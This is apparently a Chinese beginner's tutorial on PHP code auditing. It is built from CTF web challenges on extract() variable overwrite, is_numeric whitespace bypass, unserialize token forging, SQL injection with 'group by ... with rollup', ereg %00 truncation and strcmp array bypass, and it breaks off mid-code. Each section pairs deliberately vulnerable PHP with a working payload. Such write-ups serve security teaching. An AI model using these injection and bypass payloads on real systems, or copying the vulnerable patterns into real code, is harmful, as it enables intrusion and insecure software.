        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以下都是以下代码审计的一些基础漏洞,适合新手学习~</p><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract 变量覆盖"></a>extract 变量覆盖</h2><p>extract(array,extract_rules,prefix)<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。但是当变量中有同名的元素时，该函数默认将原有的值给覆盖掉。这就造成了变量覆盖漏洞。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span></span><br><span class="line"><span class="php"> &#123;</span></span><br><span class="line"><span class="php">    $content=trim(@file_get_contents($flag));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($shiyan==$content)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">   <span class="keyword">else</span></span></span><br><span class="line"><span class="php">   &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>1、文件将get方法传输进来的值通过extrace()函数处理。<br>2、通过两个if语句分别判断是否存在gift变量，和变量gift的值和变量content的值是否相等。变量content的值是通过读取变量test的值获取到的。如果两个变量相等输出flag。如果不相等，输出错误。<br>但是我们并不知道test的值是什么？所以我们使用变量覆盖漏洞，重新给test赋值。</p><p>例如：$GET[‘test’]=’a’,被extract（）函数处理后，就变成了$test=’a’,有与之同名的变量$test = ‘‘;，将其值覆盖掉。并且get方法传输的gift参数的值也为a。这样，$gift=$content。就可以获得flag。</p><p>构造我们的payload：<br>?shiyan=&amp;flag=</p><h2 id="绕过过滤的空白字符"><a href="#绕过过滤的空白字符" class="headerlink" title="绕过过滤的空白字符"></a>绕过过滤的空白字符</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$info = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">$req = [];</span></span><br><span class="line"><span class="php">$flag=<span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); <span class="comment">//为一个配置选项设置值</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>); <span class="comment">//关闭所有PHP错误报告</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'number'</span>]))&#123;</span></span><br><span class="line"><span class="php">   header(<span class="string">"hint:26966dc52e85af40f59b4fe73d8c323a.txt"</span>); <span class="comment">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); <span class="comment">//die — 等同于 exit()</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>([$_GET, $_POST] <span class="keyword">as</span> $global_var) &#123;  <span class="comment">//foreach 语法结构提供了遍历数组的简单方式</span></span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="php">        $value = trim($value);  <span class="comment">//trim — 去除字符串首尾处的空白字符（或者其他字符）</span></span></span><br><span class="line"><span class="php">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); <span class="comment">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    $number = strval($number); <span class="comment">//strval — 获取变量的字符串值</span></span></span><br><span class="line"><span class="php">    $i = <span class="number">0</span>;</span></span><br><span class="line"><span class="php">    $j = strlen($number) - <span class="number">1</span>; <span class="comment">//strlen — 获取字符串长度</span></span></span><br><span class="line"><span class="php">    <span class="keyword">while</span>($i &lt; $j) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $i++;</span></span><br><span class="line"><span class="php">        $j--;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>])) <span class="comment">//is_numeric — 检测变量是否为数字或数字字符串</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>]))) <span class="comment">//intval — 获取变量的整数值</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     $value1 = intval($req[<span class="string">"number"</span>]);</span></span><br><span class="line"><span class="php">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">     <span class="keyword">if</span>($value1!=$value2)&#123;</span></span><br><span class="line"><span class="php">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php">     <span class="keyword">else</span></span></span><br><span class="line"><span class="php">     &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span></span><br><span class="line"><span class="php">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>;</span></span><br><span class="line"><span class="php">          &#125;</span></span><br><span class="line"><span class="php">          <span class="keyword">else</span></span></span><br><span class="line"><span class="php">          &#123;</span></span><br><span class="line"><span class="php">             $info=$flag;</span></span><br><span class="line"><span class="php">          &#125;</span></span><br><span class="line"><span class="php">     &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $info;</span></span><br></pre></td></tr></table></figure><p>经过分析提交的数需要满足三个条件才能拿到flag：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>is_numeric($_REQUEST[<span class="string">'number'</span>])$req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])is_numeric函数判断是否为数字 这两句要求提交的数不能是数字包括小数</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span><span class="keyword">if</span>(intval($req[<span class="string">"number"</span>])!=$intval(strrev($req[<span class="string">"number"</span>])))这句的要求为该数的反转的整数值应该等于它本身的整数值即是一个回文数</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>is_palindrome_number($req[<span class="string">"number"</span>]))这句要求提交的数不是一个回文数</span><br><span class="line">从要求的条件我们可以构造一个绕过第一个条件和第三个条件即可</span><br><span class="line"></span><br><span class="line">is_numeric函数在开始判断前，会先跳过所有空白字符可是题目获取$req[‘number’]的时候明明使用<span class="keyword">trim</span>过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。</span><br><span class="line">所以我们构造payload=URL?%00%0c131即可绕过上面的条件获得flag</span><br></pre></td></tr></table></figure></p><h2 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> <span class="string">'common.php'</span>;</span></span><br><span class="line"><span class="php">    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span></span><br><span class="line"><span class="php">    <span class="comment">//把一个或多个数组合并为一个数组</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $where;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span></span><br><span class="line"><span class="php">            &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($where)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $sql = mysql_query(<span class="string">'select * from user where '</span>.$where);</span></span><br><span class="line"><span class="php">            <span class="comment">//函数执行一条 MySQL 查询。</span></span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> @mysql_fetch_array($sql);</span></span><br><span class="line"><span class="php">            <span class="comment">//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span></span><br><span class="line"><span class="php">    <span class="comment">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span></span><br><span class="line"><span class="php">        <span class="comment">//gzuncompress:进行字符串压缩</span></span></span><br><span class="line"><span class="php">        <span class="comment">//unserialize: 将已序列化的字符串还原回 PHP 的值</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        $db = <span class="keyword">new</span> db();</span></span><br><span class="line"><span class="php">        $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span></span><br><span class="line"><span class="php">        <span class="comment">//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'unserialize injection!!'</span>;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        header(<span class="string">'Location: index.php?error=1'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>发现这段<br><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'pass'</span>] !== $login[<span class="string">'pass'</span>])&#123;</span><br><span class="line">    echo <span class="string">'unserialize injection!!'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">"(╯‵□′)╯︵┴─┴ "</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  header(<span class="string">'Location: index.php?error=1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>login[‘user’]从这段来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">'token'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  $login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line">  $db = <span class="keyword">new</span> db();</span><br><span class="line">  $row = $db-&gt;select(<span class="string">'user=\''</span>.mysql_real_escape_string($login[<span class="string">'user'</span>]).<span class="string">'\''</span>);</span><br></pre></td></tr></table></figure></p><p>发现requset中获取token值然后对它进行unserialize，gzuncompress，base64_decode等一系列操作得到login，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserialize：对单一的已序列化的变量进行操作，将其转换回 PHP 的值</span><br><span class="line"></span><br><span class="line">gzuncompress：解压被压缩的字符串</span><br></pre></td></tr></table></figure><p>然后在login中获取键为user的值，如果等于ichunqiu就得出flag</p><p>那么我们只要对user:ichunqiu进行一系列逆操作就行<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">'ichunqiu'</span>);</span></span><br><span class="line"><span class="php">$a = base64_encode(gzcompress(serialize($a)));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $a</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="SQL注入-with-rollup绕过"><a href="#SQL注入-with-rollup绕过" class="headerlink" title="SQL注入_with rollup绕过"></a>SQL注入_with rollup绕过</h2><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/pcat" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat</a><br>在第一层的filter里面就过滤了常用的SQL关键词，所以常规的SQL 注入就不行了。如果输入了filter里面的语句，网页返回“水可载舟，亦可赛艇！”<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">0</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">1</span>#</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>' or <span class="number">1</span> limit <span class="number">1</span> offset <span class="number">2</span>#</span><br></pre></td></tr></table></figure></p><p>发现2#时返回“一颗赛艇！” 其他都是“亦可赛艇！”———–说明数据库只有两条信息<br>利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的<br>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>payload：’ or 1=1 group by pwd with rollup limit 1 offset 2 #</p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>地址:<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span></span><br><span class="line"><span class="php">  &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span></span><br><span class="line"><span class="php">   &#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">      &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span>(<span class="string">'&lt;p&gt;*-* have not been found&lt;/p&gt;'</span>);</span></span><br><span class="line"><span class="php">       &#125;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">     <span class="keyword">else</span></span></span><br><span class="line"><span class="php">     &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">      &#125;</span></span><br><span class="line"><span class="php">   &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>ereg有两个漏洞：<br>①%00截断及遇到%00则默认为字符串的结束</p><p>②当ntf为数组时它的返回值不是FALSE<br>得到想要得到flag需要三个条件<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET['password']) ！=== <span class="literal">FALSE</span>即提交的password必须是只能是一个或者多个数字、大小写字母。</span><br><span class="line"><span class="number">2.</span>strlen($_GET['password']) &lt; <span class="number">8</span> &amp;&amp; $_GET['password'] &gt; <span class="number">9999999</span> 提交的password长度要小于<span class="number">8</span>并且大小要大于<span class="number">99999999</span></span><br><span class="line"><span class="number">3.</span> strpos ($_GET['password'], '*-*') !== <span class="literal">FALSE</span> password里必须要有’-’</span><br><span class="line"></span><br><span class="line">因为ereg()函数存在NULL截断漏洞，导致正则过滤被绕过,所以可以用%<span class="number">00</span>来截断正则匹配</span><br><span class="line">第二个条件长度小于<span class="number">8</span>大小大于<span class="number">99999999</span>可以用科学计数法来绕过</span><br><span class="line"></span><br><span class="line">则最后构造password=<span class="number">1e8</span>%<span class="number">00</span>*-*即可得到flag</span><br></pre></td></tr></table></figure></p><h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;  </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">//比较两个字符串（区分大小写）</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>  </span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'No'</span>;  </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。<br>如果 str1 小于 str2 返回 &lt; 0；<br>如果 str1 大于 str2 返回 &gt; 0；<br>如果两者相等，返回 0<br>可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL,而判断使用的是==，NULL==0是 bool(true)</p><h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$flag = <span class="string">"flag"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span 